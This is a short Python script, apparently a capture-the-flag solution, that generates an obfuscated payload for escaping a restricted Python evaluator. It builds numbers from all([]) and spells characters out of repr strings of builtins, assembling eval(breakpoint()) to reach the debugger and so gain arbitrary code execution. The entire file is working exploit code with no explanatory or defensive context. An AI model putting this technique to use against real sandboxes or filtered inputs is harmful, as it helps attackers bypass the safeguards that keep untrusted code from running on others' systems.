def digit(n):
    if n == 0:
        return "+all([[]])"
    return '+'.join(['all([])'] * n)

f = f'repr(eval)[{digit(10)}]'
l = f'repr(all)[{digit(4)}]'
o = f'repr(repr)[{digit(16)}]'
a = f'repr(eval)[{digit(21)}]'
t = f'repr(repr)[{digit(5)}]'

dot = f'repr(eval({f}+{l}+{o}+{a}+{t})({digit(1)}))[{digit(1)}]'

u = f'repr(repr)[{digit(2)}]'
n = f'repr(repr)[{digit(8)}]'

c = f'repr(repr)[{digit(13)}]'
h = f"repr(eval(repr([])+{dot}+{c}+{o}+{u}+{n}+{t}))[{digit(13)}]"
r = f'repr(repr)[{digit(19)}]'

b = f'repr(repr)[{digit(1)}]'
r = r
e = f'repr(eval)[{digit(19)}]'
a = a
k = f'eval({c}+{h}+{r})({digit(107)})'
p = f'repr(repr)[{digit(21)}]'
o = o
i = f'repr(repr)[{digit(3)}]'
n = n
t = t
lb = f'repr(())[{digit(0)}]'
rb = f'repr(())[{digit(1)}]'

payload = '+'.join([b, r, e, a, k, p, o, i, n, t, lb, rb])
payload = f'eval({payload})'

print(payload)